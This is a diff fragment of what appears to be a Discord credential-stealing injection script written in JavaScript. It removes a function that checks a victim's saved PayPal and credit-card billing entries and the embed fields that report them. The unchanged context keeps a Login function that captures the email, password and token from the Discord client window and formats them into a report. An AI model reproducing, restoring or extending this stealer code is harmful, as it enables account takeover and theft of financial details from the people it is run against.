@@ -171,26 +171,6 @@ function GetBadges(flags) {
 	return badges
 }
 
-function Cool() {
-	const json = JSON.parse(info3)
-	var billing = "";
-	json.forEach(z => {
-		if (z.type == "") {
-			return "\`❌\`"
-		} else if (z.type == 2 && z.invalid != !0) {
-			billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-		} else if (z.type == 1 && z.invalid != !0) {
-			billing += "\`✔️\`" + " :credit_card:"
-		} else {
-			return "\`❌\`"
-		}
-	})
-	if (billing == "") {
-		billing = "\`❌\`"
-	}
-	return billing
-}
-
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -248,21 +228,6 @@ function Login(email, password, token) {
                         {
                             "name": " nitro type",
                             "value": `\`${GetNitro(json.premium_type)}\``,
-                            "inline": true		    
-                        },
-                        {
-                            "name": "᲼᲼᲼᲼",
-                            "value": `᲼᲼᲼᲼`,
-                            "inline": false
-                        }, 
-                        {
-                            "name": " payment method",
-                            "value": `${Cool()}`,
-                            "inline": true		    
-                        },
-                        {
-                            "name": " my type",
-                            "value": `\`is you\``,
                             "inline": true		    
                         },
                         {
